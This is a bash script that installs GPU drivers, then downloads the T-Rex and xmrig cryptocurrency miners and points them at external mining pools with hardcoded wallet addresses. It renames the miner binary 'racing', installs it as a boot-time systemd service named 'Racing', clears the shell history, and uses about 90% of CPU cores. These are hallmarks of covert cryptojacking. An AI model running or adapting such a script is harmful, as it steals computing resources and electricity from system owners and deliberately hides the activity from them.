cd /home
myip="$(dig +short myip.opendns.com @resolver1.opendns.com)"
myworker+="xna"
noCore=$(nproc --all)
usingcore=$((noCore*90/100))
sudo apt-get install linux-headers-$(uname -r) -y
distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
sudo wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-$distribution.pin
sudo mv cuda-$distribution.pin /etc/apt/preferences.d/cuda-repository-pin-600
sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/7fa2af80.pub
sudo echo "deb http://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64 /" | sudo tee /etc/apt/sources.list.d/cuda.list
sudo apt-key del 7fa2af80
sudo rm /etc/apt/sources.list.d/cuda.list
sudo wget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/cuda-keyring_1.0-1_all.deb
sudo dpkg -i cuda-keyring_1.0-1_all.deb
sudo apt-get update
sudo apt-get -y install cuda-drivers
sudo apt-get install libcurl4 -y
sudo apt-get install cuda-drivers-515 -y
sudo apt-get install cuda-drivers-fabricmanager-515 -y
sudo systemctl enable nvidia-fabricmanager
sudo systemctl start nvidia-fabricmanager
sudo nvidia-smi mig -cgi 0 -C
sudo wget https://github.com/trexminer/T-Rex/releases/download/0.25.12/t-rex-0.25.12-linux.tar.gz
sudo tar -zxvf t-rex-0.25.12-linux.tar.gz
sudo mv t-rex racing
sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a kawpow -o stratum+tcp://de.aipg.herominers.com:1128 -u ARyaz2psdKU58yVrtLzPMYAQc5hG3EPV1G."'${myworker}_One_'" -p x\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
sudo systemctl daemon-reload
sudo systemctl enable racing.service
sudo ./racing -a kawpow -o stratum+tcp://de.aipg.herominers.com:1128 -u AHxt4DaEvNjpNyTi6E5UsaP1ERKYCDZgY8.${myworker}_One_ -p x &
history -c
if [[ $noCore -eq 6 ]]
then
	sudo wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-static-x64.tar.gz
	sudo tar xvzf xmrig-6.16.2-linux-static-x64.tar.gz
	sudo ./xmrig-6.16.2/xmrig -o xtcash.trrxitte.com -u solo:cashctCevReKVH8tWbpzywjp8KdRNRCN9hsYUAUR3b6ACDUQMxq6w4njHfshSYgimUi4LuHwZXwePU1MCCn5K6Yc5uaqEUCz5z -p test -k -a argon2/chukwa -t= ${usingcore} 
else
	sudo wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-static-x64.tar.gz
	sudo tar xvzf xmrig-6.16.2-linux-static-x64.tar.gz
	sudo ./xmrig-6.16.2/xmrig -o xtcash.trrxitte.com -u solo:cashctCevReKVH8tWbpzywjp8KdRNRCN9hsYUAUR3b6ACDUQMxq6w4njHfshSYgimUi4LuHwZXwePU1MCCn5K6Yc5uaqEUCz5z -p test -k -a argon2/chukwa -t= ${usingcore} &
fi
